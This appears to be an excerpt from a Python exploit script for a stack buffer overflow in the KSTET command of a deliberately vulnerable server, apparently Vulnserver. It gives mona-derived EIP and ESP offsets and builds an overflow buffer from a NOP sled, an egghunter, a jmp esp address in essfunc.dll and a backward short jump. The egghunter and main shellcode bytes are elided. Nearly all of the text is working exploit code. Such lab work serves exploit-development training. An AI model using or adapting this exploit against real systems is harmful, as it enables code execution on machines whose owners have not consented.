...
# !mona findmsp (pattern length 94)
# EIP contains normal pattern : 0x63413363 (offset 70)
# ESP (0x00f8f9e0) points at offset 74 in normal pattern (length 20)
# EBP contains normal pattern : 0x41326341 (offset 66)

# send egg + shellcode via another command as buffer sizes with KSTET command are not big enough to hold shellcode
...
# 32 byte egghunt shellcode (egg=0x57303054, "T00WT00W")
...
crash = "\x90"*20
crash += egghunter
crash += "\x90"*(70-len(crash))
crash += "\xAF\x11\x50\x62" # jmp esp from essfunc.dll (0x625011AF); esp points into payload (offset 74 -> next line :))
crash += "\xEB\xC2\x90\x90" # jump 60 bytes back (just in front of egghunter)
crash += "C"*(94-len(crash))
